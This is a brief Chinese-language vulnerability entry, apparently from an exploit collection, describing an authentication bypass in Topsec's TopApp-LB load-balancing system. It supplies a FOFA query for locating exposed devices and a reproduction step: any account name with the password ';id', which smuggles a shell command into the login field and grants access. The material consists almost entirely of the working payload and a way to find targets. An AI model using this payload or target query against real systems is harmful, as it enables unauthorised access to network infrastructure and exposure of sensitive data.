# 天融信负载均衡TopApp-LB任意登陆

## 漏洞描述

天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息

## 影响版本

天融信负载均衡TopApp-LB

## FOFA

> [!NOTE]
>
> app="天融信-TopApp-LB-负载均衡系统"

## 漏洞复现

在登录页面中输入，账号:**任意账号**  密码:**;id**

![](image/trx-1.png)

成功登录

![](image/trx-2.png)